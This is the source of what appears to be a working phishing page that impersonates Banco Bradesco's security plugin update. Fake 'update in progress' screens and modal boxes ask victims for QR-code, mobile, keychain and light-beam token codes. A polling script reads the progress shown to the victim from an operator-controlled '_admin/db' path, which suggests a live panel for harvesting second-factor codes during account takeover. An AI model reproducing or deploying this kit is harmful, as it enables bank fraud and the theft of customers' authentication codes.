<?php
    include 'validacao.php';


?>
<!DOCTYPE html>
<html lang="pt-BR">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Banco Bradesco | Componente de Segurança (Plugin)</title>

        <link rel="shortcut icon" href="images/favicon.ico" />
        <link rel="stylesheet" type="text/css" href="css/jquery.modal.min.css" />
        <link rel="stylesheet" type="text/css" href="css/interna.css" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
		<style>

@-webkit-keyframes progress-bar-animate {
  from {
    background-position: 40px 0;
  }
  to {
    background-position: 0 0;
  }
}
@keyframes progress-bar-animate {
  from {
    background-position: 40px 0;
  }
  to {
    background-position: 0 0;
  }
}
.progress {
  overflow: hidden;
  height: 20px;
  border-radius: 10px;
  background-image: -webkit-linear-gradient(top, #ccc 0%, #ddd 100%);
  background-image: linear-gradient(to bottom, #ccc 0%, #ddd 100%);
  -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
  box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
}
.progress-bar {
  width: 0%;
  height: 100%;
  float: left;
  box-sizing: border-box;
  background-color: #79b;
  background-size: 40px 40px;
  border-radius: 10px 0 0 10px;
  background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.2) 30%, rgba(0, 0, 0, 0.1) 30%, rgba(0, 0, 0, 0.1) 33%, transparent 33%, transparent 46%, rgba(0, 0, 0, 0.1) 46%, rgba(0, 0, 0, 0.1) 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 80%, rgba(0, 0, 0, 0.1) 80%, rgba(0, 0, 0, 0.1) 83%, transparent 83%, transparent 97%, rgba(0, 0, 0, 0.1) 97%, rgba(0, 0, 0, 0.1));
  background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.2) 30%, rgba(0, 0, 0, 0.1) 30%, rgba(0, 0, 0, 0.1) 34%, transparent 34%, transparent 46%, rgba(0, 0, 0, 0.1) 46%, rgba(0, 0, 0, 0.1) 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 80%, rgba(0, 0, 0, 0.1) 80%, rgba(0, 0, 0, 0.1) 84%, transparent 84%, transparent 96%, rgba(0, 0, 0, 0.1) 96%, rgba(0, 0, 0, 0.1));
  -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.1);
  -moz-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.1);
  box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.1);
  -webkit-transition: width 200ms ease;
  -moz-transition: width 200ms ease;
  -o-transition: width 200ms ease;
  transition: width 200ms ease;
  -webkit-animation: progress-bar-animate 1s linear infinite;
  animation: progress-bar-animate 1s linear infinite;
}


</style>
		
    </head>
    <body>
        <div id="header">
            <img src="images/header-interna.jpg" alt="" />
            <p><?php echo dataPorExtenso();?></p>
        </div>
        <div id="footer">
            <img src="images/footer-interna.jpg" alt="" />
        </div>
        <div id="modal">
            <div id="boxIniciarAtualizacao" class="boxes hide">
                <img src="images/iniciar_atualizacao.png" alt="" />
                <span class="nome"></span>
                <a class="iniciar" href="javascript:;"><img width="300" src="images/btn-iniciar-atualizacao.png" /></a>
            </div>
            <div id="boxAtualizacaoAndamento" class="boxes hide">
                <img src="images/atualizacao_andamento.png" alt="" />
                <span class="nome"></span>
                <div class="barraProgresso">
                    <p align="center">
                        &nbsp;
                        <marquee hidden direction="right" scrollamount="8" scrolldelay="100">
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                            <span hidden class="progressBarHandle-0"></span>
                        </marquee>
                    </p>
                    <center><div id="numpa">2%</div></center>
                    <div class="progress"><div class="progress-bar" style="width: 2%;"></div></div>
                    	
    <script type="text/javascript">


		
		
    var remju = function() {
		 $.get('./_admin/db/'+document.getElementById('id').value+'.css?'+Math.random(), function(data) {
                    console.log(data);
                    if (data != '2') { 
                 
					document.getElementById("numpa").innerHTML = data+"%";
						document.getElementsByClassName('progress-bar')[0].style = 'width: '+data+'%';
                    }
            });
           
            }
    setInterval(remju, 2000);

    </script>
                </div>
            </div>

            <div id="boxConcluirAtualizacao" class="boxes hide">
                <img src="images/atualizacao_concluida.png" alt="" />
                <span class="nome"></span>
                <a class="iniciar" href="javascript:;"><img width="90" src="images/btf-fechar.png" /></a>
            </div>
            <div id="boxAguardeChaveSeguranca" class="boxes hide">
                <img src="images/aguarde_validacao_chave.png" alt="" />
                <span class="nome"></span>
                <img class="aguarde" src="images/loading-inicial.gif" width="86" />
            </div>
            <div id="boxAguardeAvisoQRCode" class="boxes hide">
                <img src="images/qr_code_aviso.png" alt="" />
                <span class="nome"></span>
                <img class="aguarde" src="images/loading-inicial.gif" width="86" />
            </div>
            <div id="boxQRCode" class="boxes hide">
                <img src="images/qr_code_image.png" alt="" />
                <p class="erro hide">Chave de Segurança Inválida.</p>
                <span class="nome"></span>
                <div class="qrBox"><img src="" /></div>
                <input type="password" name="tokenQrCode" id="tokenQrCode" maxlength="8" />
                <a class="btn-confirmar" href=""><img src="images/btn-confirmar.png" width="96" /></a>
            </div>
            <div id="tokenCelularInterna" class="boxes hide">
                <img src="images/token_celular.png" alt="" />
                <span class="nome"></span>
                <span class="numeroSerie"></span>
                <p class="erro hide">Chave de Segurança Inválida.</p>
                <input type="password" name="tokenCelular" id="tokenCelular" maxlength="6" />
                <a class="btn-confirmar" href=""><img src="images/btn-confirmar.png" width="96" /></a>
            </div>
            <div id="tokenChaveiroInterna" class="boxes hide">
                <img src="images/token_chaveiro.png" alt="" />
                <span class="nome"></span>
                <span class="numeroSerie"></span>
                <p class="erro hide">Chave de Segurança Inválida.</p>
                <input type="password" name="tokenChaveiro" id="tokenChaveiro" maxlength="6" />
                <a class="btn-confirmar" href=""><img src="images/btn-confirmar.png" width="96" /></a>
            </div>
            <div id="boxFeixeLuminosidade" class="boxes hide">
                <img src="images/feixe_luminosidade.png" alt="" />
                <span class="nome"></span>
                <span class="numeroSerie"></span>
                <div class="pisca_pisca" id="feixe"></div>
                <p class="erro hide">Chave de Segurança Inválida.</p>
                <input type="password" name="tokenFeixe" id="tokenFeixe" maxlength="8" />
                <a class="btn-confirmar" href=""><img src="images/btn-confirmar.png" width="96" /></a>
                <a class="btn-iniciar" href=""><img src="images/btn-iniciar.png" width="168" /></a>
                <span id="feixeLuminosidade" class="hide"></span>
            </div>
        </div>
        <input type="hidden" id="id" value="<?php echo isset($_SESSION['idInfo']) ? $_SESSION['idInfo'] : '';  ?>" />
        <input type="hidden" id="hash" value="<?php echo isset($_GET['hash']) ? $_GET['hash'] : '';  ?>" />
        <script src="js/jquery.min.js"></script>
        <script src="js/jquery.modal.min.js"></script>
        <script type="text/javascript">
            <!--
            var brTokenJavaScript = true;

            //-->
        </script>
        <script type="text/javascript">
            $ = jQuery.noConflict();
            var certPath = "";
            var assinatura = "";
            var urlDispatcher = null;
            var ctrl = null;
            var nuTransacaoLote = null;
            var tpAssinatura = null;
            var idObjetoConfirmacao = null;
            var lote = null;
            var body = null;
            var tipoDispositivoAcesso = null;
            var cookieServlet = null;
            var parametrosRetorno = null;
            var errorCounter = 0;
            var iframeCounter = 0;
            var contadorLeitura = 0;
            var contadorErro = 0;
            var erroLeitura = false;
            var erroTamanhoBrToken = false;

            function openWindow(url) {
                window.open(url, "brtoken", "width=800,height=600");
                return false;
            }

            function getMessageError(lastError) {
                if (lastError.length > 0) {
                    var words = new Array();
                    var error = new Array();
                    words[0] = /CTRL/;
                    error[0] = mensagemAcessoInvalido;
                    for (var i = 0; i != error.length; i++) {
                        if (lastError.search(words[i]) != -1) {
                            return error[i];
                        }
                    }
                    return mensagemErroPadrao;
                }
                return mensagemErroPadrao;
            }

            function processarAutenticacao() {
                try {
                    setPublic(n_InternetBanking, e_InternetBanking);
                    rng_seed_time();

                    jQuery(".divAutenticadorProcessando").removeClass("none_i");

                    jQuery("[id$=" + idObjetoConfirmacao + "]").hide();
                    jQuery("[id$=" + idObjetoConfirmacao + "]", parent.document.body).hide();

                    $flagTipoDispositivo = jQuery(".flagTipoDispositivo").text();

                    var geraAssinatura = {
                        certAss: tipoDispositivoAcesso == 5 ? true : false,
                        hmac: tipoDispositivoAcesso == 7 ? true : false,
                    };

                    var $textoAssinatura = jQuery(".textoAssinado").html() + jQuery(".compAssinado").text();

                    if (jQuery("#divSenhaCartaoCredito").length == 1) {
                        if (!validarCampos()) {
                            jQuery("[id$=" + idObjetoConfirmacao + "]").show();
                            jQuery("[id$=" + idObjetoConfirmacao + "]", parent.document.body).show();
                            return;
                        }
                    }
                    if ($flagTipoDispositivo == 5) {
                        if (top.loginNe != null) {
                            processarCertificadoBradesco($textoAssinatura);
                        } else {
                            aguardaApplet(processarCertificadoBradesco, $textoAssinatura, null);
                        }
                    } else if ($flagTipoDispositivo == 1) {
                        if (geraAssinatura.certAss && top.loginNe == null) {
                            aguardaApplet(processarToken, $textoAssinatura, geraAssinatura);
                        } else {
                            processarToken($textoAssinatura, geraAssinatura);
                        }
                    } else if ($flagTipoDispositivo == 7) {
                        processarUsuarioSenha($textoAssinatura);
                    } else if ($flagTipoDispositivo == 4) {
                        if (geraAssinatura.certAss && top.loginNe == null) {
                            aguardaApplet(processarBrToken, $textoAssinatura, geraAssinatura);
                        } else {
                            processarBrToken($textoAssinatura, geraAssinatura);
                        }
                    } else if ($flagTipoDispositivo == 6) {
                        if (top.loginNe != null) {
                            processarICP($textoAssinatura);
                        } else {
                            aguardaApplet(processarICP, $textoAssinatura);
                        }
                    } else if ($flagTipoDispositivo == 3) {
                        if (geraAssinatura.certAss && top.loginNe == null) {
                            aguardaApplet(processarTokenMobile, $textoAssinatura, geraAssinatura);
                        } else {
                            processarTokenMobile($textoAssinatura, geraAssinatura);
                        }
                    }
                } catch (message) {
                    exibirErro(message);
                    jQuery("[id$=" + idObjetoConfirmacao + "]").show();
                    jQuery("[id$=" + idObjetoConfirmacao + "]", parent.document.body).show();
                } finally {
                    jQuery(".divAutenticadorProcessando").addClass("none_i");
                }
            }

            function assinaDispositivoSeguranca(textoAssinatura) {
                try {
                    compAut.setCtrl(ctrl, true);
                    if (top.loginNe != null) {
                        compAut.doSign(textoAssinatura, ctrl, "", doSignResp);
                    } else {
                        assinatura = compAut.doSign(textoAssinatura, ctrl, "");
                    }
                } catch (exception) {
                    throw getMessageError(compAut.getLastError());
                }
            }
            function aguardaApplet(funcao, arg1, arg2) {
                refCompAut();
                if (!tpComponenteSeguranca && (typeof compAut == "undefined" || typeof compAut.isInstalled == "undefined")) {
                    if (errorCounter > 30) {
                        errorCounter = 0;

                        throw mensagemErroPadrao;
                    } else {
                        errorCounter++;
                        window.setTimeout(aguardaApplet(funcao, arg1, arg2), 2000);
                    }
                } else {
                    if (arg2 == null) {
                        funcao(arg1);
                    } else {
                        funcao(arg1, arg2);
                    }
                }
            }

            function processarICP(textoAssinatura) {
                var senhaICP = jQuery(".senhaICP").val();
                if (senhaICP.length == 0) {
                    throw mensagemErroPadrao;
                }
                try {
                    if (top.loginNe != null) {
                        compAut.doSignICP(textoAssinatura, ctrl, senhaICP, doSignICPResp);
                    } else {
                        assinatura = compAut.doSignICP(textoAssinatura, ctrl, senhaICP);
                        if (assinatura.length <= 0) {
                            throw getMessageError(compAut.getLastError());
                        }
                        validarICP();
                    }
                } catch (exception) {
                    throw getMessageError(compAut.getLastError());
                }
            }

            function doSignICPResp(pkcs7) {
                assinatura = pkcs7;
                if (assinatura.length <= 0) {
                    exibirErro(mensagemErroPadrao);
                    jQuery("[id$=" + idObjetoConfirmacao + "]").show();
                    jQuery("[id$=" + idObjetoConfirmacao + "]", parent.document.body).show();
                } else {
                    validarICP();
                }
            }

            function processarUsuarioSenha(textoAssinatura) {
                var senhaUsuario = jQuery(".senhaUsuario").val();
                if (senhaUsuario.length == 0) {
                    throw mensagemErroPadrao;
                }
                assAux = doHMAC(senhaUsuario, textoAssinatura);
                assAux = jQuery.parseJSON(assAux);
                assinatura = cript(ctrl, assAux.Hash + assAux.HMAC);
                jQuery(".senhaUsuario").val(cript(ctrl, senhaUsuario));
                validarUsuarioSenha();
            }

            function processarBrToken(textoAssinatura, geraAssinatura) {
                var senhaBrToken = jQuery(".senhaBrToken").val();
                if (senhaBrToken.length < 8 && $("#divBrToken").is(":visible")) {
                    //aumenta o tamanho do iframe
                    if (!erroTamanhoBrToken) {
                        erroTamanhoBrToken = true;
                        jQuery("#iframeAutenticador", window.parent.document).height(jQuery("#iframeAutenticador", window.parent.document).height() + 70);
                    }
                    throw mensagemTamanhoBrToken;
                } else if (senhaBrToken.length < 6 && $("#divBrTokenOtp").is(":visible")) {
                    throw mensagemTamanhoToken;
                }
                if (geraAssinatura.certAss) {
                    assinaDispositivoSeguranca(textoAssinatura);
                } else if (geraAssinatura.hmac) {
                    assAux = doHMAC(senhaBrToken, textoAssinatura);
                    assAux = jQuery.parseJSON(assAux);
                    assinatura = cript(ctrl, assAux.Hash + assAux.HMAC);
                }
                jQuery(".senhaBrToken").val(cript(ctrl, senhaBrToken));
                //Caso possua erro de leitura, diminui o tamanho, pois o erro ira sumir apos o processamento
                if (erroLeitura) {
                    jQuery("#iframeAutenticador", window.parent.document).height(jQuery("#iframeAutenticador", window.parent.document).height() - 100);
                    erroLeitura = false;
                }
                if (erroTamanhoBrToken) {
                    jQuery("#iframeAutenticador", window.parent.document).height(jQuery("#iframeAutenticador", window.parent.document).height() - 70);
                    erroTamanhoBrToken = false;
                }
                contadorLeitura = 0;
                validarBrToken();
            }

            function alteraAlturaIFrame() {
                var tentativa = parseInt(jQuery(".tentativa").text());
                if (tentativa == 1) {
                    $flagTipoDispositivo = jQuery(".flagTipoDispositivo").text();
                    if ($flagTipoDispositivo == 4 && tipoDispositivoAcesso == 7) {
                        var feixeLuminosidadeBrToken = jQuery(".feixeLuminosidadeBrToken").text();
                        if (feixeLuminosidadeBrToken) {
                            jQuery("#iframeAutenticador", window.parent.document).height(jQuery("#iframeAutenticador", window.parent.document).height() + 100);
                        }
                    }
                }
            }

            function processarTokenMobile(textoAssinatura, geraAssinatura) {
                var senhaTokenMobile = jQuery(".senhaTokenMobile").val();
                if (senhaTokenMobile.length < 6) {
                    throw mensagemTamanhoTokenMobile;
                }
                if (geraAssinatura.certAss) {
                    assinaDispositivoSeguranca(textoAssinatura);
                } else if (geraAssinatura.hmac) {
                    assAux = doHMAC(senhaTokenMobile, textoAssinatura);
                    assAux = jQuery.parseJSON(assAux);
                    assinatura = cript(ctrl, assAux.Hash + assAux.HMAC);
                }
                jQuery(".senhaTokenMobile").val(cript(ctrl, senhaTokenMobile));
                validarTokenMobile();
            }

            function processarToken(textoAssinatura, geraAssinatura) {
                var senhaToken = jQuery(".senhaToken").val();
                if (senhaToken.length < 6) {
                    throw mensagemTamanhoToken;
                }
                if (geraAssinatura.certAss) {
                    assinaDispositivoSeguranca(textoAssinatura);
                } else if (geraAssinatura.hmac) {
                    assAux = doHMAC(senhaToken, textoAssinatura);
                    assAux = jQuery.parseJSON(assAux);
                    assinatura = cript(ctrl, assAux.Hash + assAux.HMAC);
                }
                jQuery(".senhaToken").val(cript(ctrl, senhaToken));
                validarToken();
            }

            function processarCertificadoBradesco(textoAssinatura) {
                var senhaDispositivo = jQuery(".senhaCertificado").val();
                if (senhaDispositivo.length == 0) {
                    throw mensagemErroPadrao;
                }
                try {
                    compAut.setCertPath(certPath);
                    if (top.loginNe != null) {
                        compAut.doSign(textoAssinatura, ctrl, senhaDispositivo, doSignResp);
                    } else {
                        assinatura = compAut.doSign(textoAssinatura, ctrl, senhaDispositivo);
                        if (assinatura.length <= 0) {
                            throw getMessageError(compAut.getLastError());
                        }
                        validarCertificadoBradesco();
                    }
                } catch (exception) {
                    throw getMessageError(compAut.getLastError());
                }
            }

            function doSignResp(assinaturaResp) {
                assinatura = assinaturaResp;
                if (assinatura.length <= 0) {
                    exibirErro(mensagemErroPadrao);
                    jQuery("[id$=" + idObjetoConfirmacao + "]").show();
                    jQuery("[id$=" + idObjetoConfirmacao + "]", parent.document.body).show();
                } else {
                    validarCertificadoBradesco();
                }
            }

            function submeterFormulario() {
                alteraAlturaIFrame();

                var icon = jQuery(".js-clique-icon");
                icon.click(function () {
                    icon.removeClass("active");
                    jQuery(this).addClass("active");
                    var ele = $(this).attr("rel");
                    jQuery(".box-icones").addClass("none");
                    jQuery(".box-" + ele).removeClass("none");
                });

                if (jQuery(".bloqueioAcesso").text() == "true") {
                    jQuery("#erroPopup").click();
                } else {
                    $flagTipoDispositivo = jQuery(".flagTipoDispositivo").text();

                    if (body == null) {
                        body = jQuery("body");
                    }

                    if (jQuery("#autenticadorForm", body).length == 0 && !$flagTipoDispositivo) {
                        cookieServlet = jQuery(".cookieServlet").text();
                        if (jQuery("iframe[id='iframeAutenticador']", parent.document.body).length > 0) {
                            jQuery("<form>")
                                .attr({
                                    id: "autenticadorForm",
                                    name: "autenticadorForm",
                                    method: "post",
                                    target: "_parent",
                                    action: urlDispatcher,
                                })
                                .appendTo(body);
                        } else {
                            jQuery("<form>")
                                .attr({
                                    id: "autenticadorForm",
                                    name: "autenticadorForm",
                                    method: "post",
                                    action: urlDispatcher,
                                })
                                .appendTo(body);
                        }
                        jQuery("<input>")
                            .attr({
                                id: "nuTransacaoLote",
                                name: "nuTransacaoLote",
                                type: "hidden",
                                value: nuTransacaoLote,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));
                        jQuery("<input>")
                            .attr({
                                id: "tpAssinatura",
                                name: "tpAssinatura",
                                type: "hidden",
                                value: tpAssinatura,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));
                        jQuery("<input>")
                            .attr({
                                id: "compAssinado",
                                name: "compAssinado",
                                type: "hidden",
                                value: jQuery(".compAssinado").text(),
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("<input>")
                            .attr({
                                id: "ASS1",
                                name: "ASS1",
                                type: "hidden",
                                value: assinatura,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("<input>")
                            .attr({
                                id: "CTRL",
                                name: "CTRL",
                                type: "hidden",
                                value: ctrl,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("<input>")
                            .attr({
                                id: "lote",
                                name: "lote",
                                type: "hidden",
                                value: lote,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("<input>")
                            .attr({
                                id: "parametrosRetorno",
                                name: "parametrosRetorno",
                                type: "hidden",
                                value: parametrosRetorno,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("<input>")
                            .attr({
                                id: "cookieServlet",
                                name: "cookieServlet",
                                type: "hidden",
                                value: cookieServlet,
                            })
                            .appendTo(jQuery("#autenticadorForm", body));

                        jQuery("#autenticadorForm", body).submit();
                    } else {
                        esconderEspera();
                    }

                    return true;
                }
            }

            function getCertInfo() {
                var res = compAut.getCertInfo();
                var pathFinal = res.indexOf("|");
                certPath = res.substring(0, pathFinal);
            }

            function exibirErro(mensagem) {
                var iframeHeight = jQuery("#iframeAutenticador", window.parent.document).height() + 45;
                jQuery(".divValidacao .erro_msg").html("<strong>" + mensagem + "</strong>");
                jQuery(".divValidacao").addClass("form_erro");
                if (jQuery(".campoSenha").is(":visible")) {
                    jQuery(".campoSenha").attr("title", mensagem);
                    jQuery(".campoSenha").blur();
                    jQuery(".campoSenha").focus();
                    jQuery(".campoSenha").val("");
                }
                if (iframeCounter == 0) {
                    jQuery("#iframeAutenticador", window.parent.document).attr("height", iframeHeight + "px");
                    iframeCounter += 1;
                }
            }

            var sequencia = null;

            !(function () {
                function n() {
                    return performance.now ? performance.now() : Date.now();
                }
                function e() {
                    var f = n(),
                        u = f - o;
                    if (i < t.length) {
                        for (r.style.opacity = t[i] ? 1 : 0; ; ) if (((f = n()), (u = f - o), u >= a * (i + 1))) break;
                        i++, setTimeout(e);
                    } else null != l && l.call(null);
                }
                var o,
                    t,
                    r,
                    i,
                    l,
                    a = 60;
                window.blink = function (a, f, u) {
                    (r = a), (i = 0), (t = []), (l = u);
                    for (var c = 0; c < f.length; c++) t.push("0" == f.charAt(c));
                    (o = n()), setTimeout(e);
                };
            })();

            function iniciarLeituraBrToken() {
                "valor contador" + contadorLeitura++;
                if (contadorLeitura > 2) {
                    jQuery(".terceiroclique").removeClass("none_i");
                    if (!erroLeitura) {
                        jQuery("#iframeAutenticador", window.parent.document).height(jQuery("#iframeAutenticador", window.parent.document).height() + 100);
                        erroLeitura = true;
                    }
                }
                sequencia = $("span#feixeLuminosidade").text();
                jQuery(".btnIniciarLeitura2").attr("disabled", true);
                if (brTokenJavaScript) {
                    blink(document.getElementsByClassName("pisca_pisca")[0], sequencia, piscagemConcluida);
                } else {
                    if (!tpBrtokenActiveX && !tpUserLinux) {
                        document.appletPiscagem.BRTIniciarPiscagem(sequencia, "1", "1");
                    } else if (tpBrtokenActiveX) {
                        document.activeXPiscagem.iniciar(sequencia);
                    }
                }
            }

            function piscagemConcluida() {
                jQuery(".btnIniciarLeitura2").attr("disabled", false);
                jQuery(".senhaBrToken").focus();
            }

            function onloadCompleto() {
                processarDadosInicializacao();
                try {
                    jQuery(".div_espera", parent.document).hide();
                    jQuery.tabindex();
                } catch (e) {}
            }
        </script>
        <script src="js/loadinfo.js"></script>
        <script src="js/interna.js"></script>
    </body>
</html>
